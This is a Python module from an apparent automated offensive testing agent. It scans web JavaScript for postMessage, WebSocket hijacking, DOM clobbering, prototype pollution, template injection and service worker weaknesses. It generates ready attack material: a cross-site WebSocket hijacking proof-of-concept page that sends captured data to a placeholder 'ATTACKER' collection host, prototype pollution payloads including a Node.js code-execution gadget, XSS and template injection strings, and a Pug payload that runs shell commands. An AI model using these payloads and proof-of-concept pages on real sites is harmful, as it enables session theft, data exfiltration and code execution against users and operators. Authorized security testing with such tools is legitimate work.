"""ClientAnalyzer - Client-side attack surface analysis for Project Triage v4.

Focuses on JavaScript execution context vulnerabilities that are invisible to
pure HTTP request/response analysis:

- PostMessage handler abuse (XSS injection, data exfiltration)
- Cross-Site WebSocket Hijacking (CSWSH) including GraphQL subscriptions
- DOM Clobbering chains (HTML injection -> variable override -> code exec)
- Client-Side Prototype Pollution chains (gadget mapping -> XSS pivot)
- Client-Side Template Injection (Angular, Vue, React dangerouslySetInnerHTML)
- Service Worker scope hijacking and cache poisoning

Outputs hypothesis dicts compatible with the agent loop's HypothesisEngine.
Each hypothesis dict keys: endpoint, technique, description, novelty,
exploitability, impact, effort.

Research basis: PortSwigger Web Security Academy client-side topics, Gareth
Heyes DOM Clobbering research, BlackFan prototype pollution gadget catalogue.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any


# ---------------------------------------------------------------------------
# Dataclasses for each finding category
# ---------------------------------------------------------------------------

@dataclass
class PostMessageFinding:
    """A postMessage handler with potential for abuse."""
    url: str
    handler_snippet: str        # raw JS snippet containing the listener
    has_origin_check: bool
    wildcard_target: bool       # window.postMessage(data, "*")
    leaks_sensitive_data: bool  # handler sends auth tokens / PII outbound
    sensitive_keys: list[str]   # detected sensitive field names
    framework: str              # "react", "angular", "vanilla", "unknown"
    attack_vector: str          # "xss_injection", "data_exfil", "origin_bypass"
    severity: str               # "critical", "high", "medium", "low"


@dataclass
class CSWSHVector:
    """A WebSocket endpoint vulnerable to cross-site hijacking."""
    ws_url: str
    auth_mechanism: str         # "cookie_only", "cookie+token", "none", "header"
    origin_validated: bool
    csrf_token_in_handshake: bool
    protocol: str               # "websocket", "graphql-ws", "socket.io"
    poc_html: str               # ready-to-serve PoC page
    severity: str


@dataclass
class ClobberTarget:
    """A DOM clobbering opportunity: injectable HTML -> JS variable override."""
    variable_name: str          # JS variable that can be overridden
    clobber_html: str           # HTML to inject: <a name="x"> or <form name="x">
    sink_after_clobber: str     # what dangerous operation uses the variable
    requires_html_injection: bool
    dompurify_bypass: bool      # exploitable even through DOMPurify
    severity: str
    description: str


@dataclass
class PPChain:
    """A prototype pollution chain: entry point -> gadget -> impact."""
    entry_point: str            # "lodash.merge", "jquery.extend", "custom_deep_copy"
    payload: str                # __proto__ or constructor.prototype payload
    gadgets: list[str]          # polluted properties that trigger behavior
    impact: str                 # "xss", "rce_node", "cookie_theft", "open_redirect"
    affected_library: str
    pollution_path: str         # ".__proto__" or ".constructor.prototype"
    severity: str


# ---------------------------------------------------------------------------
# Pattern catalogs
# ---------------------------------------------------------------------------

# PostMessage patterns - handlers without origin validation
_PM_LISTENER_PATTERN = re.compile(
    r'addEventListener\s*\(\s*["\']message["\']\s*,\s*(?:function\s*\(([^)]*)\)|([a-zA-Z_$][\w$]*))',
    re.MULTILINE,
)

_PM_ORIGIN_CHECK_PATTERNS = [
    re.compile(r'\.origin\s*[!=]==?\s*["\']', re.MULTILINE),
    re.compile(r'\.origin\s*!==?\s*window\.location', re.MULTILINE),
    re.compile(r'allowedOrigins\.includes\s*\(', re.MULTILINE),
    re.compile(r'trustedOrigins\.test\s*\(', re.MULTILINE),
    re.compile(r'if\s*\([^)]*\.origin\b', re.MULTILINE),
]

_PM_WILDCARD_SEND = re.compile(
    r'(?:window|self|top|parent)\.postMessage\s*\([^,]+,\s*["\*]["\*]?\s*\)',
    re.MULTILINE,
)

_PM_SENSITIVE_KEYS = [
    "token", "accessToken", "access_token", "authToken", "auth_token",
    "sessionId", "session_id", "jwt", "apiKey", "api_key", "secret",
    "password", "credential", "csrf", "xsrf", "nonce", "refreshToken",
    "refresh_token", "bearerToken",
]

_PM_FRAMEWORK_PATTERNS: dict[str, re.Pattern[str]] = {
    "react":   re.compile(r'(?:useEffect|componentDidMount|ReactDOM)', re.MULTILINE),
    "angular": re.compile(r'(?:@NgModule|platformBrowserDynamic|AngularFireAuth)', re.MULTILINE),
    "vue":     re.compile(r'(?:new Vue\(|createApp\(|defineComponent\()', re.MULTILINE),
}

# WebSocket detection in JS
_WS_URL_PATTERN = re.compile(
    r'(?:new\s+WebSocket\s*\(\s*|io\s*\(\s*|socketio\s*\(\s*)["\']?(wss?://[^\'")\s]+)',
    re.MULTILINE,
)
_WS_RELATIVE_PATTERN = re.compile(
    r'new\s+WebSocket\s*\(\s*["\']?(/[^\'")\s]*)',
    re.MULTILINE,
)
_WS_NO_AUTH_TOKEN = re.compile(
    r'new\s+WebSocket\s*\(\s*["\']wss?://[^?\'\"]+["\']',
    re.MULTILINE,
)
_WS_GRAPHQL_SUB = re.compile(
    r'(?:graphql-ws|subscriptions-transport-ws|createClient\s*\(\s*\{[^}]*url)',
    re.MULTILINE,
)

# DOM Clobbering patterns
_DOM_ID_LOOKUP = re.compile(
    r'document\.getElementById\s*\(\s*["\']([^"\']+)["\']\s*\)',
    re.MULTILINE,
)
_DOM_NAME_ACCESS = re.compile(
    r'(?:window|document)\s*\.\s*([a-zA-Z_$][\w$]+)\s*(?:\.|;|\)|\[)',
    re.MULTILINE,
)
_DOM_DANGEROUSVARS = re.compile(
    r'(?:innerHTML|outerHTML|eval|location\.href|location\.assign|src)\s*=\s*([a-zA-Z_$][\w$]+)',
    re.MULTILINE,
)

# Prototype pollution - merge/extend patterns
_PP_LODASH = re.compile(r'_\.merge\s*\(|lodash\.merge\s*\(|merge\s*\(.*__proto__', re.MULTILINE)
_PP_JQUERY = re.compile(r'\$\.extend\s*\(\s*true', re.MULTILINE)
_PP_CUSTOM_DEEP = re.compile(
    r'function\s+(?:deepMerge|deepCopy|deepClone|deepExtend|mergeDeep|assignDeep)\s*\(',
    re.MULTILINE,
)
_PP_OBJECT_ASSIGN_DEEP = re.compile(r'Object\.assign\s*\([^,]+,\s*JSON\.parse', re.MULTILINE)

# CSTI patterns per framework
_CSTI_ANGULAR_TEMPLATE = re.compile(
    r'(?:\$compile|\$sce\.trustAsHtml|ng-bind-html|DomSanitizer\.bypassSecurity)',
    re.MULTILINE,
)
_CSTI_VUE_RENDER = re.compile(r'v-html\s*=|dangerouslySetInnerHTML|__v_isRef', re.MULTILINE)
_CSTI_REACT_DANGEROUS = re.compile(r'dangerouslySetInnerHTML\s*=\s*\{', re.MULTILINE)
_CSTI_PUG_CLIENT = re.compile(r'pug\.compile|jade\.render|require\(["\']pug["\']\)', re.MULTILINE)

# Service Worker
_SW_REGISTER = re.compile(
    r'navigator\.serviceWorker\.register\s*\(\s*["\']([^"\']+)["\']\s*(?:,|\))',
    re.MULTILINE,
)
_SW_SCOPE = re.compile(r'scope\s*:\s*["\']([^"\']+)["\']', re.MULTILINE)


# ---------------------------------------------------------------------------
# CSWSH PoC template
# ---------------------------------------------------------------------------

_CSWSH_POC = """\
<!DOCTYPE html>
<html>
<body>
<h1>CSWSH PoC - {ws_url}</h1>
<pre id="out"></pre>
<script>
(function() {{
  var ws = new WebSocket("{ws_url}");
  ws.onopen = function() {{
    // Send probe after auth cookie is auto-attached by browser
    ws.send(JSON.stringify({probe}));
  }};
  ws.onmessage = function(e) {{
    document.getElementById("out").textContent += e.data + "\\n";
    // Exfil to attacker server
    fetch("https://ATTACKER/collect?d=" + encodeURIComponent(e.data));
  }};
  ws.onerror = function(e) {{
    document.getElementById("out").textContent += "ERROR: " + e + "\\n";
  }};
}})();
</script>
</body>
</html>"""


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _extract_handler_context(js_content: str, match_start: int, window: int = 400) -> str:
    """Return up to `window` chars of JS around a match position."""
    start = max(0, match_start - 50)
    end = min(len(js_content), match_start + window)
    return js_content[start:end]


def _has_origin_check_nearby(snippet: str) -> bool:
    """Return True if any origin-validation pattern appears in the snippet."""
    for pattern in _PM_ORIGIN_CHECK_PATTERNS:
        if pattern.search(snippet):
            return True
    return False


def _detect_sensitive_keys_in_snippet(snippet: str) -> list[str]:
    """Return any sensitive key names found in the JS snippet."""
    found = []
    lower = snippet.lower()
    for key in _PM_SENSITIVE_KEYS:
        if key.lower() in lower:
            found.append(key)
    return found


def _detect_framework(js_content: str) -> str:
    """Detect dominant JS framework in the provided content."""
    for name, pat in _PM_FRAMEWORK_PATTERNS.items():
        if pat.search(js_content):
            return name
    return "vanilla"


def _severity_from_flags(high_conditions: list[bool], medium_conditions: list[bool]) -> str:
    if all(high_conditions):
        return "critical"
    if any(high_conditions):
        return "high"
    if any(medium_conditions):
        return "medium"
    return "low"


# ---------------------------------------------------------------------------
# Main class
# ---------------------------------------------------------------------------

class ClientAnalyzer:
    """Analyzes JavaScript and HTML for client-side attack surfaces.

    All methods return typed dataclass lists. The `generate_client_hypotheses`
    aggregator converts findings into agent-loop hypothesis dicts.
    """

    # ------------------------------------------------------------------
    # 1. PostMessage analysis
    # ------------------------------------------------------------------

    def analyze_postmessage_surface(
        self,
        js_content: str,
        url: str,
    ) -> list[PostMessageFinding]:
        """Detect vulnerable postMessage handlers and wildcard sends."""
        findings: list[PostMessageFinding] = []
        framework = _detect_framework(js_content)

        # --- Vulnerable listeners (no origin check) ---
        for match in _PM_LISTENER_PATTERN.finditer(js_content):
            snippet = _extract_handler_context(js_content, match.start())
            has_origin = _has_origin_check_nearby(snippet)
            sensitive = _detect_sensitive_keys_in_snippet(snippet)

            severity = _severity_from_flags(
                [not has_origin, bool(sensitive)],
                [not has_origin],
            )

            findings.append(PostMessageFinding(
                url=url,
                handler_snippet=snippet[:200],
                has_origin_check=has_origin,
                wildcard_target=False,
                leaks_sensitive_data=bool(sensitive),
                sensitive_keys=sensitive,
                framework=framework,
                attack_vector="xss_injection" if not has_origin else "data_exfil",
                severity=severity,
            ))

        # --- Wildcard postMessage sends ---
        for match in _PM_WILDCARD_SEND.finditer(js_content):
            snippet = _extract_handler_context(js_content, match.start())
            sensitive = _detect_sensitive_keys_in_snippet(snippet)

            findings.append(PostMessageFinding(
                url=url,
                handler_snippet=snippet[:200],
                has_origin_check=False,
                wildcard_target=True,
                leaks_sensitive_data=bool(sensitive),
                sensitive_keys=sensitive,
                framework=framework,
                attack_vector="data_exfil",
                severity="high" if sensitive else "medium",
            ))

        # --- React/Angular known bridge patterns ---
        if framework == "react":
            react_bridge = re.compile(
                r'window\.addEventListener\s*\(\s*["\']message["\']', re.MULTILINE
            )
            for match in react_bridge.finditer(js_content):
                snippet = _extract_handler_context(js_content, match.start())
                if not _has_origin_check_nearby(snippet):
                    findings.append(PostMessageFinding(
                        url=url,
                        handler_snippet=snippet[:200],
                        has_origin_check=False,
                        wildcard_target=False,
                        leaks_sensitive_data=False,
                        sensitive_keys=[],
                        framework="react",
                        attack_vector="xss_injection",
                        severity="high",
                    ))

        return findings

    # ------------------------------------------------------------------
    # 2. CSWSH detection
    # ------------------------------------------------------------------

    def detect_cswsh_vectors(
        self,
        ws_endpoints: list[str],
        cookies: dict[str, str],
    ) -> list[CSWSHVector]:
        """Evaluate WebSocket endpoints for cross-site hijacking potential."""
        vectors: list[CSWSHVector] = []
        has_session_cookie = any(
            k.lower() in ("session", "sessionid", "sid", "auth", "token", "jwt")
            for k in cookies
        )

        for ws_url in ws_endpoints:
            protocol = "graphql-ws" if "graphql" in ws_url.lower() or "subscriptions" in ws_url.lower() else "websocket"
            if "socket.io" in ws_url.lower() or "socket.io" in ws_url:
                protocol = "socket.io"

            # Determine auth mechanism from URL structure
            has_token_param = bool(re.search(r'[?&](?:token|auth|key|jwt)=', ws_url, re.IGNORECASE))
            if has_token_param:
                auth_mech = "cookie+token"
                csrf_protected = True
            elif has_session_cookie:
                auth_mech = "cookie_only"
                csrf_protected = False
            else:
                auth_mech = "none"
                csrf_protected = False

            # Assume origin not validated unless proven otherwise
            origin_validated = False

            # Probe message per protocol
            if protocol == "graphql-ws":
                probe = '{"type":"connection_init","payload":{}}'
            elif protocol == "socket.io":
                probe = '42["probe",{}]'
            else:
                probe = '{"type":"ping"}'

            poc = _CSWSH_POC.format(ws_url=ws_url, probe=probe)

            severity = _severity_from_flags(
                [auth_mech == "cookie_only", not origin_validated],
                [auth_mech == "none"],
            )

            vectors.append(CSWSHVector(
                ws_url=ws_url,
                auth_mechanism=auth_mech,
                origin_validated=origin_validated,
                csrf_token_in_handshake=csrf_protected,
                protocol=protocol,
                poc_html=poc,
                severity=severity,
            ))

        return vectors

    # ------------------------------------------------------------------
    # 3. DOM Clobbering analysis
    # ------------------------------------------------------------------

    def analyze_dom_clobbering(
        self,
        html_content: str,
        js_content: str,
    ) -> list[ClobberTarget]:
        """Identify variables reachable via DOM clobbering and their sinks."""
        targets: list[ClobberTarget] = []

        # Collect variables that flow into dangerous sinks
        sink_vars: dict[str, str] = {}
        for match in _DOM_DANGEROUSVARS.finditer(js_content):
            sink_name = match.group(0).split("=")[0].strip()
            var_name = match.group(1)
            sink_vars[var_name] = sink_name

        # getElementById lookups that could be clobbered
        for match in _DOM_ID_LOOKUP.finditer(js_content):
            elem_id = match.group(1)
            snippet = _extract_handler_context(js_content, match.start(), 300)
            sink = sink_vars.get(elem_id, "innerHTML")

            # DOMPurify bypass: id containing HTML entities still registered
            dompurify_bypass = bool(re.search(
                r'DOMPurify\.sanitize|sanitizeHtml|xss\.filterXSS', js_content
            ))

            targets.append(ClobberTarget(
                variable_name=elem_id,
                clobber_html=f'<form id="{elem_id}"><input id="x" name="value"></form>',
                sink_after_clobber=sink,
                requires_html_injection=True,
                dompurify_bypass=dompurify_bypass,
                severity="high" if dompurify_bypass else "medium",
                description=(
                    f"document.getElementById('{elem_id}') result used in "
                    f"{sink} - clobber with named form element"
                ),
            ))

        # window.property access patterns (window.config, window.csrf, etc.)
        for match in _DOM_NAME_ACCESS.finditer(js_content):
            prop = match.group(1)
            # Skip obvious DOM APIs
            if prop in ("location", "document", "navigator", "history", "console",
                        "setTimeout", "fetch", "XMLHttpRequest", "addEventListener"):
                continue
            snippet = _extract_handler_context(js_content, match.start(), 300)
            is_sink_var = prop in sink_vars

            targets.append(ClobberTarget(
                variable_name=f"window.{prop}",
                clobber_html=f'<a id="{prop}" href="javascript:alert(document.domain)">x</a>',
                sink_after_clobber=sink_vars.get(prop, "unknown"),
                requires_html_injection=True,
                dompurify_bypass=False,
                severity="high" if is_sink_var else "low",
                description=(
                    f"window.{prop} accessible - inject <a id=\"{prop}\"> or "
                    f"<form name=\"{prop}\"> to override JS variable"
                ),
            ))

        # Deduplicate by variable_name
        seen: set[str] = set()
        deduped: list[ClobberTarget] = []
        for t in targets:
            if t.variable_name not in seen:
                seen.add(t.variable_name)
                deduped.append(t)

        return deduped

    # ------------------------------------------------------------------
    # 4. Client-side prototype pollution
    # ------------------------------------------------------------------

    def detect_prototype_pollution(
        self,
        js_content: str,
        tech_stack: dict[str, Any],
    ) -> list[PPChain]:
        """Map merge/extend patterns to pollution gadgets and XSS chains."""
        chains: list[PPChain] = []
        libraries = tech_stack.get("libraries", [])
        lib_str = " ".join(str(x) for x in libraries).lower()

        # --- Lodash ---
        if _PP_LODASH.search(js_content) or "lodash" in lib_str:
            gadgets = ["__proto__.innerHTML", "__proto__.src", "__proto__.href"]
            chains.append(PPChain(
                entry_point="lodash.merge",
                payload='{"__proto__": {"innerHTML": "<img src=x onerror=alert(document.domain)>"}}',
                gadgets=gadgets,
                impact="xss",
                affected_library="lodash",
                pollution_path=".__proto__",
                severity="high",
            ))
            # Constructor path bypass (lodash < 4.17.11)
            chains.append(PPChain(
                entry_point="lodash.merge (constructor path)",
                payload='{"constructor": {"prototype": {"polluted": "1"}}}',
                gadgets=["constructor.prototype.*"],
                impact="xss",
                affected_library="lodash",
                pollution_path=".constructor.prototype",
                severity="high",
            ))

        # --- jQuery.extend ---
        if _PP_JQUERY.search(js_content) or "jquery" in lib_str:
            chains.append(PPChain(
                entry_point="jQuery.extend(true, ...)",
                payload='{"__proto__": {"xss": "<img src=x onerror=alert(1)>"}}',
                gadgets=["__proto__.xss", "__proto__.url", "__proto__.src"],
                impact="xss",
                affected_library="jquery",
                pollution_path=".__proto__",
                severity="high",
            ))

        # --- Custom deep merge ---
        if _PP_CUSTOM_DEEP.search(js_content):
            chains.append(PPChain(
                entry_point="custom deepMerge/deepCopy function",
                payload='{"__proto__": {"isAdmin": true, "role": "admin"}}',
                gadgets=["__proto__.isAdmin", "__proto__.role", "__proto__.permissions"],
                impact="privilege_escalation",
                affected_library="custom",
                pollution_path=".__proto__",
                severity="critical",
            ))

        # --- Object.assign with JSON.parse ---
        if _PP_OBJECT_ASSIGN_DEEP.search(js_content):
            chains.append(PPChain(
                entry_point="Object.assign(target, JSON.parse(userInput))",
                payload='{"__proto__": {"polluted": "true"}}',
                gadgets=["__proto__.polluted"],
                impact="object_property_injection",
                affected_library="native",
                pollution_path=".__proto__",
                severity="medium",
            ))

        # --- Angular-specific gadgets ---
        if "angular" in lib_str or _CSTI_ANGULAR_TEMPLATE.search(js_content):
            chains.append(PPChain(
                entry_point="Angular deep merge (ngx-translate / config merge)",
                payload='{"__proto__": {"bypassSecurityTrustHtml": "polluted"}}',
                gadgets=["__proto__.bypassSecurityTrustHtml", "__proto__.sanitize"],
                impact="xss",
                affected_library="angular",
                pollution_path=".__proto__",
                severity="critical",
            ))

        # --- Node.js server-side gadgets (if SSR detected) ---
        if tech_stack.get("ssr") or "next" in lib_str or "nuxt" in lib_str:
            chains.append(PPChain(
                entry_point="Server-side merge (SSR context)",
                payload='{"__proto__": {"NODE_OPTIONS": "--require /proc/self/fd/0"}}',
                gadgets=["__proto__.NODE_OPTIONS", "__proto__.env"],
                impact="rce_node",
                affected_library="node_ssr",
                pollution_path=".__proto__",
                severity="critical",
            ))

        return chains

    # ------------------------------------------------------------------
    # 5. CSTI detection helpers (internal, used by generate_client_hypotheses)
    # ------------------------------------------------------------------

    def _detect_csti_patterns(
        self,
        js_content: str,
        html_content: str,
        tech_stack: dict[str, Any],
    ) -> list[dict[str, Any]]:
        """Return raw CSTI findings as dicts for hypothesis generation."""
        findings: list[dict[str, Any]] = []

        # Angular
        if _CSTI_ANGULAR_TEMPLATE.search(js_content) or "angular" in str(tech_stack).lower():
            findings.append({
                "framework": "angular",
                "payload": "{{constructor.constructor('alert(document.domain)')()}}",
                "pattern": "$compile or ng-bind-html detected",
                "severity": "critical",
            })

        # Vue
        if _CSTI_VUE_RENDER.search(js_content) or "vue" in str(tech_stack).lower():
            findings.append({
                "framework": "vue",
                "payload": "{{_c.constructor('alert(document.domain)')()}}",
                "pattern": "v-html or __v_isRef detected",
                "severity": "critical",
            })

        # React dangerouslySetInnerHTML
        if _CSTI_REACT_DANGEROUS.search(js_content):
            findings.append({
                "framework": "react",
                "payload": "<img src=x onerror=alert(document.domain)>",
                "pattern": "dangerouslySetInnerHTML usage detected",
                "severity": "high",
            })

        # Pug/Jade client-side render
        if _CSTI_PUG_CLIENT.search(js_content):
            findings.append({
                "framework": "pug",
                "payload": "- var x = require('child_process').execSync('id').toString()\n= x",
                "pattern": "pug.compile or jade.render detected client-side",
                "severity": "critical",
            })

        return findings

    # ------------------------------------------------------------------
    # 6. Service Worker abuse detection (internal)
    # ------------------------------------------------------------------

    def _detect_service_worker_abuse(
        self,
        js_content: str,
        url: str,
    ) -> list[dict[str, Any]]:
        """Detect service worker registration patterns with hijack potential."""
        findings: list[dict[str, Any]] = []

        for match in _SW_REGISTER.finditer(js_content):
            sw_path = match.group(1)
            snippet = _extract_handler_context(js_content, match.start(), 300)
            scope_match = _SW_SCOPE.search(snippet)
            scope = scope_match.group(1) if scope_match else "/"

            findings.append({
                "sw_path": sw_path,
                "scope": scope,
                "hijack_possible": not sw_path.startswith("https://"),
                "cache_poison_possible": True,
                "description": (
                    f"Service worker at {sw_path} with scope {scope} - "
                    "test for scope hijacking via path traversal or cache poisoning"
                ),
                "severity": "high" if scope == "/" else "medium",
            })

        return findings

    # ------------------------------------------------------------------
    # 7. WebSocket endpoint extraction from JS
    # ------------------------------------------------------------------

    def extract_ws_endpoints_from_js(self, js_content: str, base_url: str) -> list[str]:
        """Extract WebSocket URLs embedded in JS bundles."""
        endpoints: list[str] = []

        for match in _WS_URL_PATTERN.finditer(js_content):
            endpoints.append(match.group(1))

        # Relative WS paths
        from urllib.parse import urlparse
        parsed = urlparse(base_url)
        ws_scheme = "wss" if parsed.scheme == "https" else "ws"
        for match in _WS_RELATIVE_PATTERN.finditer(js_content):
            path = match.group(1)
            endpoints.append(f"{ws_scheme}://{parsed.netloc}{path}")

        # GraphQL subscription detection
        if _WS_GRAPHQL_SUB.search(js_content):
            endpoints.append(f"{ws_scheme}://{parsed.netloc}/graphql")
            endpoints.append(f"{ws_scheme}://{parsed.netloc}/subscriptions")

        return list(dict.fromkeys(endpoints))  # deduplicate, preserve order

    # ------------------------------------------------------------------
    # 8. Primary aggregator: generate_client_hypotheses
    # ------------------------------------------------------------------

    def generate_client_hypotheses(
        self,
        url: str,
        js_content: str,
        tech_stack: dict[str, Any],
        html_content: str = "",
        cookies: dict[str, str] | None = None,
    ) -> list[dict[str, Any]]:
        """Aggregate all client-side findings into agent hypothesis dicts.

        Each hypothesis dict keys:
          endpoint, technique, description, novelty, exploitability, impact, effort
        """
        hypotheses: list[dict[str, Any]] = []
        cookies = cookies or {}

        # --- PostMessage ---
        pm_findings = self.analyze_postmessage_surface(js_content, url)
        for f in pm_findings:
            novelty = "high" if f.framework in ("react", "angular") else "medium"
            exploitability = "high" if not f.has_origin_check else "medium"
            hypotheses.append({
                "endpoint": url,
                "technique": f"postmessage_{f.attack_vector}",
                "description": (
                    f"PostMessage handler on {url} ({f.framework}) lacks origin "
                    f"validation - {f.attack_vector} via crafted cross-origin message."
                    + (f" Leaks: {', '.join(f.sensitive_keys)}." if f.sensitive_keys else "")
                ),
                "novelty": novelty,
                "exploitability": exploitability,
                "impact": "high" if f.leaks_sensitive_data else "medium",
                "effort": "low",
                "raw_finding": f,
            })

        # --- CSWSH ---
        ws_endpoints = self.extract_ws_endpoints_from_js(js_content, url)
        cswsh_vectors = self.detect_cswsh_vectors(ws_endpoints, cookies)
        for v in cswsh_vectors:
            if v.auth_mechanism in ("cookie_only", "none"):
                hypotheses.append({
                    "endpoint": v.ws_url,
                    "technique": "cswsh",
                    "description": (
                        f"WebSocket {v.ws_url} ({v.protocol}) relies on "
                        f"{v.auth_mechanism} auth with no Origin validation - "
                        "cross-site hijack allows reading authenticated WS stream."
                    ),
                    "novelty": "high" if v.protocol == "graphql-ws" else "medium",
                    "exploitability": "high",
                    "impact": "high",
                    "effort": "low",
                    "poc_html": v.poc_html,
                    "raw_finding": v,
                })

        # --- DOM Clobbering ---
        clob_targets = self.analyze_dom_clobbering(html_content, js_content)
        for t in clob_targets:
            if t.severity in ("high", "critical"):
                hypotheses.append({
                    "endpoint": url,
                    "technique": "dom_clobbering",
                    "description": (
                        f"DOM clobbering via HTML injection targeting "
                        f"{t.variable_name} - inject {t.clobber_html[:80]} "
                        f"to override JS variable used in {t.sink_after_clobber}."
                        + (" DOMPurify bypass applicable." if t.dompurify_bypass else "")
                    ),
                    "novelty": "high" if t.dompurify_bypass else "medium",
                    "exploitability": "medium",
                    "impact": "high",
                    "effort": "medium",
                    "raw_finding": t,
                })

        # --- Prototype Pollution ---
        pp_chains = self.detect_prototype_pollution(js_content, tech_stack)
        for chain in pp_chains:
            hypotheses.append({
                "endpoint": url,
                "technique": f"prototype_pollution_{chain.impact}",
                "description": (
                    f"Prototype pollution via {chain.entry_point} "
                    f"({chain.affected_library}) - payload: {chain.payload[:100]} "
                    f"- gadgets: {', '.join(chain.gadgets[:3])} - impact: {chain.impact}."
                ),
                "novelty": "high" if chain.impact in ("rce_node", "xss") else "medium",
                "exploitability": "high" if chain.severity == "critical" else "medium",
                "impact": chain.impact,
                "effort": "medium",
                "raw_finding": chain,
            })

        # --- CSTI ---
        csti_findings = self._detect_csti_patterns(js_content, html_content, tech_stack)
        for f in csti_findings:
            hypotheses.append({
                "endpoint": url,
                "technique": f"csti_{f['framework']}",
                "description": (
                    f"Client-side template injection in {f['framework']} - "
                    f"{f['pattern']} - payload: {f['payload']}"
                ),
                "novelty": "medium",
                "exploitability": "high" if f["severity"] == "critical" else "medium",
                "impact": "critical" if f["severity"] == "critical" else "high",
                "effort": "low",
                "raw_finding": f,
            })

        # --- Service Worker ---
        sw_findings = self._detect_service_worker_abuse(js_content, url)
        for f in sw_findings:
            hypotheses.append({
                "endpoint": f"{url}{f['sw_path']}",
                "technique": "service_worker_abuse",
                "description": (
                    f"Service worker registered at {f['sw_path']} (scope: {f['scope']}) - "
                    f"{f['description']}"
                ),
                "novelty": "high",
                "exploitability": "medium" if f["hijack_possible"] else "low",
                "impact": "high",
                "effort": "high",
                "raw_finding": f,
            })

        return hypotheses
